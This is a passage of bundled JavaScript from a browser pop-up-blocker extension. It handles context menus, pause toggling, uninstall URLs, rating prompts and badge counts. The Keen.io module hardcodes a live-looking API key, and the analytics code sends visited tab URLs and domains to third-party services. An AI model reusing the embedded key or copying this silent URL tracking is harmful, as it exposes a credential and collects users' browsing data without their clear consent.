	        settings.pb_GASettings.ga_sendAllEvents = (0, _utils.getRandomInt)(0, config.ga_allEvent_rate) == 13; // 13/rate to send all events 
	      }

	      return settings;
	    });
	  }

	  function setInlineUninstall(tabId) {
	    chrome.tabs.query({}, function (tabs) {
	      tabs.forEach(function (t) {
	        if (vald(t.url)) {
	          chrome.tabs.sendMessage(t.id, { name: "offUninstallMonitor" });
	        }
	      });
	      _PBStorageSync2.default.pb_numOfBlocks.get().then(function (blockNumber) {
	        chrome.tabs.sendMessage(tabId, {
	          name: "setUninstallMonitor", data: {
	            blockCounts: blockNumber,
	            version: (0, _utils.getManifestInfo)().version
	          }
	        });
	      });
	    });
	  }

	  /*
	   create a normal chrome context menu item
	   @param {object} prop - the item properties
	   */
	  function createNormalMenuItem(itemID, prop) {
	    //sometimes there might be multiple menu items created
	    // removeMenu(itemID);
	    var itemProp = {
	      type: "normal",
	      id: itemID
	    };
	    $.extend(itemProp, prop);

	    chrome.contextMenus.create(itemProp);
	  }
	  /*
	   remove context menu item
	   @param {String} item - the context item id
	   */
	  function removeMenu(item) {
	    try {
	      chrome.contextMenus.remove(item);
	    } catch (e) {
	      //do nothing
	    }
	  }
	  /*
	   On chrome runtime events
	   */

	  chrome.runtime.onInstalled.addListener(function (details) {
	    if (details.reason == "install") {
	      trackGAEvent({ category: "General", action: "Install", label: extVersion }, true);

	      chrome.tabs.create({ url: _const2.default['thank_you_page_' + (0, _utils.getBrowser)()] });
	    } else if (details.reason == "update") {
	      trackGAEvent({ category: "General", action: "Update", label: extVersion }, true);
	    }
	  });

	  chrome.browserAction.setTitle({ title: getExtensionVersion() });

	  function getExtensionVersion() {
	    return (0, _utils.getManifestInfo)().name + " " + (0, _utils.getManifestInfo)().version;
	  }

	  /*
	   set chrome uninstall url
	   */

	  function setUninstallURL(blockCounts) {
	    /*
	     chrome uninstall  not sure if it is this, but we have to try
	     otherwise we have to set it in to the uninstall page
	     we have to set it here because of the callback issue
	     */
	    var uninstallUrl = _const2.default['uninstall_page_' + (0, _utils.getBrowser)()] + "version=" + (0, _utils.getManifestInfo)().version + "&block=" + blockCounts || 0;
	    chrome.runtime.setUninstallURL(uninstallUrl, function () {
	      //do nothing
	    });
	  }

	  function createBrowserActionContextMenuItem(paused) {
	    var id = "togglePB";
	    var contextMenuProp = { contexts: ["browser_action"] };
	    contextMenuProp.title = paused ? (0, _utils.getI18N)("enablePB") : (0, _utils.getI18N)("disablePB");
	    createNormalMenuItem(id, contextMenuProp);
	  }

	  function createBrowserContextRemoveOverlay(paused) {
	    if (paused) {
	      removeMenu("removeOL");
	    } else {
	      createNormalMenuItem("removeOL", {
	        title: (0, _utils.getI18N)("blockOverlayButtonLabel"),
	        contexts: _const2.default.overlay_blocking_context_item_contexts
	      });
	    }
	  }

	  function togglePB() {
	    _PBStorageSync2.default.pb_pause.update(function (paused) {
	      var isRunning = !paused; // last status is pause or not, not updated yet
	      chrome.tabs.query({}, function (tabs) {
	        tabs.forEach(function (tab) {
	          chrome.tabs.sendMessage(tab.id, { name: "toggleFunction", toggle: paused }); // if last status is paused, then enable, otherwise disable
	          if (tab.active) {
	            trackGAEvent({ category: "Right_click_menu", action: isRunning ? "Pause" : "Start", label: tab.url });
	          }
	        });
	      });
	      //so set the chrome icon too
	      chrome.browserAction.setIcon({ path: isRunning ? "/images/icon128_g.png" : "/images/icon128.png" });
	      removeMenu("togglePB");
	      createBrowserActionContextMenuItem(isRunning);
	      createBrowserContextRemoveOverlay(isRunning);
	      return isRunning;
	    });
	  }

	  /*
	   update storage and open report data
	   */
	  function reportSite(info) {
	    var reportWebSiteRequest = _const2.default.feedback_page + ("&subject=" + encodeURI(info.message) + "&message=" + encodeURI(info.host));

	    chrome.tabs.create({ url: reportWebSiteRequest });
	  }

	  /*
	   send Message to current tab and get data
	   */
	  function getCurrentTabData(callback) {
	    chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
	      var tab = tabs[0];

	      if ((0, _utils.isValidUrl)(tab.url)) {
	        chrome.tabs.sendMessage(tab.id, { name: 'getReportData' }, function (data) {
	          callback(data);
	        });
	      } else {
	        callback({ referrer: '', url: tab.url });
	      }
	    });
	  }
	};

	__webpack_require__(1);

	var _ga = __webpack_require__(13);

	var _ga2 = _interopRequireDefault(_ga);

	var _keen = __webpack_require__(14);

	var _keen2 = _interopRequireDefault(_keen);

	var _rating = __webpack_require__(15);

	var _rating2 = _interopRequireDefault(_rating);

	var _badge = __webpack_require__(16);

	var _badge2 = _interopRequireDefault(_badge);

	var _PBStorageSync = __webpack_require__(3);

	var _PBStorageSync2 = _interopRequireDefault(_PBStorageSync);

	var _const = __webpack_require__(10);

	var _const2 = _interopRequireDefault(_const);

	var _utils = __webpack_require__(2);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	var _Promise = typeof Promise === 'undefined' ? __webpack_require__(5).Promise : Promise;

/***/ }),
/* 13 */
/***/ (function(module, exports, __webpack_require__) {

	"use strict";

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _utils = __webpack_require__(2);

	var GoogleAnalytics = {}; /* A simple interface to Google Analytics that doesn't require script access */


	GoogleAnalytics.tid = "";
	GoogleAnalytics.sendEvent = {};
	GoogleAnalytics.api = function (data) {
	  var dimensionInfo = {};
	  dimensionInfo["dimension1"] = (0, _utils.getManifestInfo)().version;

	  ga("send", 'event', data[0], data[1], data[2], dimensionInfo);
	};

	GoogleAnalytics.trackEvent = function (category, action, label) {
	  GoogleAnalytics.api([category, action, label]);
	};

	GoogleAnalytics.init = function (tid) {
	  (function (i, s, o, g, r, a, m) {
	    i['GoogleAnalyticsObject'] = r;
	    i[r] = i[r] || function () {
	      (i[r].q = i[r].q || []).push(arguments);
	    }, i[r].l = 1 * new Date();
	    a = s.createElement(o), m = s.getElementsByTagName(o)[0];
	    a.async = 1;
	    a.src = g;
	    m.parentNode.insertBefore(a, m);
	  })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
	  ga('create', tid, 'auto');
	  ga('set', 'checkProtocolTask', null);
	};

	exports.default = GoogleAnalytics;

/***/ }),
/* 14 */
/***/ (function(module, exports) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
		value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var KeenIO = function () {
		_createClass(KeenIO, [{
			key: 'conf',
			get: function get() {
				return {
					version: 3,
					url: 'https://api.keen.io/3.0/projects/59785940c9e77c00012a2904/events/@EVENT:@VERSION?api_key=BAEA44E007D337E70A1ED6034A289A2D68E98276B88157AB7D287E9F2D961704FD0AA5467C95D61A6506EDA80162FAF1BF50E343A4E3E3957B7927C3135DDA7BE38346C00ACB327885AEB05504921A3B48B56997D62EFC99E9BFF8B08EF573E5&data=@DATA&r=@RAND'
				};
			}
		}]);

		function KeenIO(props) {
			var _this = this;

			_classCallCheck(this, KeenIO);

			this.props = props;

			chrome.runtime.onMessage.addListener(function (request) {
				if (request.name == 'KeenIO') {
					_this.recordEvent(request.data.event, request.data.post);
				}
			});
		}

		_createClass(KeenIO, [{
			key: 'recordEvent',
			value: function recordEvent(event, data) {
				data = this.prepData(data);

				var img = document.createElement('img');
				img.src = this.conf.url.replace('@EVENT', event).replace('@VERSION', this.conf.version).replace('@DATA', btoa(JSON.stringify(data))).replace('@RAND', Math.random());

				img = null;
			}
		}, {
			key: 'prepData',
			value: function prepData(data) {
				if (data.url && !data.domain) {
					data.domain = new URL(data.url).host;
				}

				data.extVersion = this.props.extVersion;

				return data;
			}
		}]);

		return KeenIO;
	}();

	exports.default = KeenIO;

/***/ }),
/* 15 */
/***/ (function(module, exports, __webpack_require__) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
		value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	var _PBStorageSync = __webpack_require__(3);

	var _PBStorageSync2 = _interopRequireDefault(_PBStorageSync);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var Rating = function () {
		function Rating(conf) {
			var _this = this;

			_classCallCheck(this, Rating);

			this.events = conf.Events;
			this.show = conf.show || { after: 5, every: 30 };

			_PBStorageSync2.default.pb_rating.get().then(function (data) {
				_this.data = _this.initialize(data);

				_this.initEvents();
			});
		}

		_createClass(Rating, [{
			key: 'initialize',
			value: function initialize(data) {
				return data || {
					showCount: 0,
					nextDisplay: this.show.after,
					complete: false
				};
			}
		}, {
			key: 'update',
			value: function update(action, sender) {
				switch (action) {
					case 'display':
						_PBStorageSync2.default.pb_rating.removeAndSet(++this.data.showCount && this.data);
						break;

					case 'click':
						if (!this.data.complete && this.data.showCount >= this.data.nextDisplay) {
							this.events.showRating({ tabId: sender.tab.id });

							_PBStorageSync2.default.pb_rating.removeAndSet((this.data.nextDisplay += this.show.every) && this.data);
						}
						break;

					case 'complete':
						_PBStorageSync2.default.pb_rating.removeAndSet((this.data.complete = true) && this.data);
						break;
				}
			}
		}, {
			key: 'initEvents',
			value: function initEvents() {
				/*chrome.runtime.onMessage.addListener((request, sender) => {
	   	//we are using trackEvent as it already contains all data we need
	   	if (request.name == 'trackEvent' && /^notification_bar/i.test(request.category)) {
	   		switch (request.action.toLowerCase()) {
	   			case 'shown':
	   				this.Storage.requestSet(++ this.data.showCount && this.data);
	   				break;
	   					case 'click':
	   				if (this.data.showCount >= this.data.nextDisplay) {
	   					this.events.showRating({tabId: sender.tab.id});
	   					
	   					this.Storage.requestSet((this.data.nextDisplay += this.show.every) && this.data);
	   				} else {
	   					this.dependency.route(request, sender);
	   				}
	   				break;
	   		}
	   	}
	   });*/
			}
		}]);

		return Rating;
	}();

	/*

	Storage:{
	      requestGet:function () {
	        return PBStorageSync.pb_rating.get();
	      },
	      requestSet:function (data) {
	        PBStorageSync.pb_rating.removeAndSet(data);
	      }
	    },

	*/


	exports.default = Rating;

/***/ }),
/* 16 */
/***/ (function(module, exports, __webpack_require__) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
		value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	var _PBStorageSync = __webpack_require__(3);

	var _PBStorageSync2 = _interopRequireDefault(_PBStorageSync);

	var _utils = __webpack_require__(2);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var BadgeManager = function () {
		function BadgeManager() {
			_classCallCheck(this, BadgeManager);
		}

		_createClass(BadgeManager, [{
			key: 'toggle',
			value: function toggle(show) {
				var _this = this;

				_PBStorageSync2.default.pb_hideBadge.set(!show);

				chrome.tabs.query({}, function (tabs) {
					tabs.forEach(function (tab) {
						if (show) {
							_this.setBadge(tab);
						} else {
							chrome.browserAction.setBadgeText({ text: '', tabId: tab.id });
						}
					});
				});
			}
		}, {
			key: 'setBadge',
			value: function setBadge(tab) {
				try {
					(0, _utils.getTodayBlockCount)(_PBStorageSync2.default, new URL(tab.url).host, function (count) {
						chrome.browserAction.setBadgeText({ text: (count || '') + '', tabId: tab.id });
					});
				} catch (e) {}
			}
		}]);

		return BadgeManager;
	}();

	exports.default = BadgeManager;

/***/ })
/******/ ]);